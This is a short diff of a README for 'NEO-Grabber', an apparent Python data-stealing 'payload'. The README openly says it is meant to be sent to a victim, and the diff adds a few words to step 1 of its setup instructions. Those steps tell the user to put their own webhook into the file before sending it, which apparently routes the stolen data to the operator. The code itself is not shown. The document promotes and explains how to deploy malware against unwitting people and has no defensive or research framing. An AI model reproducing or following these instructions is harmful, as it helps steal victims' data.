@@ -4,7 +4,7 @@
 # NEO-Grabber
  Really Simple "Payload" written in python. You also must change some things in the file before sending it to the victim!
 # SETUP
->**1. Download the File and Open it in Notepad or open it as a txt file.**
+>**1. Download the File NEO GRABBER file and Open it in Notepad or open it as a txt file.**
 
 >**2. In the 5th line of a code, find a word "WEBHOOK". After that remove it and paste your own webhook in the middle of quotation marks.**
 
